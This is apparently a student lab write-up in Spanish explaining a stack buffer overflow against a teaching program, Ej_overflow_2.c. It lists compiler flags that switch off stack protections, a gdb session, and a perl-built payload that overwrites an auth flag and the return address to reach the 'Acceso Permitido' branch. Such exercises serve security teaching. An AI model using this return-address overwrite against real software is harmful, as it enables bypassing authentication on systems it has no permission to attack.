#### Explicación del TP2:
En este trabajo logramos pisar la direccion de rotorno del programa Ej_overflow_2.c

Utilizamos Linux Mint 20 (Ubuntu 64 bits), y compilados el archivo con los siguientes flags:

<em><strong> gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o pisar Ej_overflow_2.c </strong></em>

Una vez compilado el archivo, obtenemos un ejecutable llamado "pisar" y lo corremos en gdb:

<em><strong> gdb -q pisar </strong></em>

Luego, procedemos a correr el programa con la siguiente entrada:

<em><strong> run $(perl -e 'print "A"x20 ."\x01\xc0\x04\x08"."\x18\xd1\xff\xff"."\xdc\x92\x04\x08" ') </strong></em>

Lo que se está haciendo es:
1. Llenar password_buffer con 16 caracteres "A".
2. Pisar la variable entera auth_flag con 4 caracteres "A". 
3. Manter los 4 Bytes de proteccion con el mismo valor (01c00408h). 
4. Mantener el puntero EBP (18d1ffffh). 
5. Pisar la direccion a donde tiene que retorar la funcion "check_authentication" con el valor dc920408h. Siendo este la dirección de la instruccion donde se hace un print a "Acceso Permitido..!!".


NOTA: Tener en cuenta que el procesador trabaja con la secuencia de orden Little Endian, por lo que las direcciones en los pasos 3, 4 y 5 están escritas en orden de "LSB --> MSB".
